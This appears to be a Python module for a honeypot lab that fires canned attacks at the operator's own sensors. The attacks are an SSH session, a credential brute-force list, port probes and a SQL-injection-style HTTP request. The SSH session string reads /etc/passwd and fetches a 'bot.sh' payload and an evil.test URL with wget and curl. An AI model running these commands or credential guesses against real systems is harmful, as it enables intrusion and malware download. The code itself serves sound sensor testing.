"""
Live honeypot triggers — the ADMIN "click to attack your own lab" actions
behind POST /api/v1/admin/diagnostics/trigger/{trigger_id}.

Each trigger is a fixed, server-defined network action against this
operator's own honeypot ports (Cowrie/Dionaea/Honeytrap). trigger_id only
*selects* one of the functions below — no client-supplied text ever reaches
a socket, a shell, or a command line. Mirrors the allow-list-only design of
app.services.container_manager.

Reachability: the backend container is deliberately NOT on honeynet_edge
(see docker-compose.yml) — same isolation a real attacker would face. These
triggers instead go out through HONEYPOT_TRIGGER_HOST (default
host.docker.internal), the same host-published ports
(docker-compose `ports:`) a human operator already uses from outside Docker.
That is not a new hole: those ports are published to the host either way.
"""

from __future__ import annotations

import asyncio
import os
import time
from typing import Any, Dict, List, Optional

import httpx

_HOST = os.getenv("HONEYPOT_TRIGGER_HOST", "host.docker.internal")

_PORTS = {
    "ssh": int(os.getenv("HONEYPOT_SSH_PORT", "2222")),
    "telnet": int(os.getenv("HONEYPOT_TELNET_PORT", "2223")),
    "smb": int(os.getenv("HONEYPOT_SMB_PORT", "445")),
    "ftp": int(os.getenv("HONEYPOT_FTP_PORT", "2121")),
    "mssql": int(os.getenv("HONEYPOT_MSSQL_PORT", "1433")),
    "ht1": int(os.getenv("HONEYPOT_HTTP_PORT", "8022")),
    "ht2": int(os.getenv("HONEYPOT_ALT_PORT", "8023")),
}

_TRIGGER_TIMEOUT = 30.0


async def _tcp_connect(port: int, timeout: float = 4.0) -> Dict[str, Any]:
    start = time.monotonic()
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(_HOST, port), timeout=timeout
        )
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        return {"ok": True, "port": port, "ms": round((time.monotonic() - start) * 1000)}
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "port": port, "error": f"{e.__class__.__name__}: {e}"}


def _ssh_attempt_blocking(
    user: str, password: str, run_commands: Optional[str], timeout: float
) -> Dict[str, Any]:
    """Runs on a worker thread — paramiko is synchronous."""
    import paramiko

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            _HOST,
            port=_PORTS["ssh"],
            username=user,
            password=password,
            timeout=timeout,
            banner_timeout=timeout,
            auth_timeout=timeout,
            look_for_keys=False,
            allow_agent=False,
        )
        output = None
        if run_commands:
            _stdin, stdout, stderr = client.exec_command(run_commands, timeout=timeout)
            output = (
                stdout.read().decode(errors="replace")
                + stderr.read().decode(errors="replace")
            )[:4000]
        return {"ok": True, "user": user, "authenticated": True, "output": output}
    except paramiko.AuthenticationException:
        return {"ok": True, "user": user, "authenticated": False}
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "user": user, "error": f"{e.__class__.__name__}: {e}"}
    finally:
        try:
            client.close()
        except Exception:
            pass


async def _ssh_session() -> Dict[str, Any]:
    # Matches sensors/cowrie/userdb.txt: root/anything-but-the-rejected-list
    # succeeds. hunter2 isn't on the reject list, so this always logs in.
    cmds = (
        "whoami; id; uname -a; cat /etc/passwd; ps aux; "
        "wget http://185.99.1.7/bot.sh; curl http://evil.test/x; ls -la /tmp"
    )
    return await asyncio.to_thread(_ssh_attempt_blocking, "root", "hunter2", cmds, 10.0)


async def _ssh_bruteforce() -> Dict[str, Any]:
    # First six combos are on cowrie's explicit reject list -> login.failed;
    # the rest fall through to "anything succeeds".
    combos = [
        ("root", "root"), ("root", "123456"), ("root", "password"), ("root", "admin"),
        ("admin", "admin"), ("admin", "123456"), ("oracle", "guess"), ("pi", "raspberry"),
    ]
    results = [
        await asyncio.to_thread(_ssh_attempt_blocking, user, password, None, 6.0)
        for user, password in combos
    ]
    return {"ok": True, "attempts": results}


async def _telnet_probe() -> Dict[str, Any]:
    return {"ok": True, "telnet": await _tcp_connect(_PORTS["telnet"])}


async def _dionaea_probe() -> Dict[str, Any]:
    return {
        "ok": True,
        "results": {
            "smb": await _tcp_connect(_PORTS["smb"]),
            "ftp": await _tcp_connect(_PORTS["ftp"]),
            "mssql": await _tcp_connect(_PORTS["mssql"]),
        },
    }


async def _honeytrap_probe() -> Dict[str, Any]:
    out: Dict[str, Any] = {}
    async with httpx.AsyncClient(timeout=5.0) as client:
        try:
            r1 = await client.get(f"http://{_HOST}:{_PORTS['ht1']}/")
            out["ht1"] = {"ok": True, "status_code": r1.status_code}
        except Exception as e:  # noqa: BLE001
            out["ht1"] = {"ok": False, "error": f"{e.__class__.__name__}: {e}"}
        try:
            r2 = await client.get(
                f"http://{_HOST}:{_PORTS['ht2']}/", params={"id": "1' OR '1'='1"}
            )
            out["ht2"] = {"ok": True, "status_code": r2.status_code}
        except Exception as e:  # noqa: BLE001
            out["ht2"] = {"ok": False, "error": f"{e.__class__.__name__}: {e}"}
    return {"ok": True, "results": out}


async def _port_sweep() -> Dict[str, Any]:
    results = {name: await _tcp_connect(port, timeout=2.0) for name, port in _PORTS.items()}
    return {"ok": True, "results": results}


TRIGGERS: Dict[str, Dict[str, Any]] = {
    "ssh_session": {"label": "Cowrie SSH — full session (best data)", "run": _ssh_session},
    "ssh_bruteforce": {"label": "Cowrie SSH — 8 brute-force attempts", "run": _ssh_bruteforce},
    "telnet": {"label": "Cowrie Telnet — connect", "run": _telnet_probe},
    "dionaea": {"label": "Dionaea — SMB / FTP / MSSQL connect", "run": _dionaea_probe},
    "honeytrap": {"label": "Honeytrap — HTTP + SQLi-looking request", "run": _honeytrap_probe},
    "port_sweep": {"label": "Full port sweep — every sensor", "run": _port_sweep},
}


async def run_trigger(trigger_id: str) -> Dict[str, Any]:
    entry = TRIGGERS.get(trigger_id)
    if not entry:
        return {"ok": False, "trigger": trigger_id, "error": f"unknown trigger '{trigger_id}'"}
    try:
        result = await asyncio.wait_for(entry["run"](), timeout=_TRIGGER_TIMEOUT)
        return {"ok": True, "trigger": trigger_id, "host": _HOST, "result": result}
    except asyncio.TimeoutError:
        return {"ok": False, "trigger": trigger_id, "error": "timed out"}
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "trigger": trigger_id, "error": f"{e.__class__.__name__}: {e}"}


def list_triggers() -> List[Dict[str, str]]:
    return [{"id": k, "label": v["label"]} for k, v in TRIGGERS.items()]
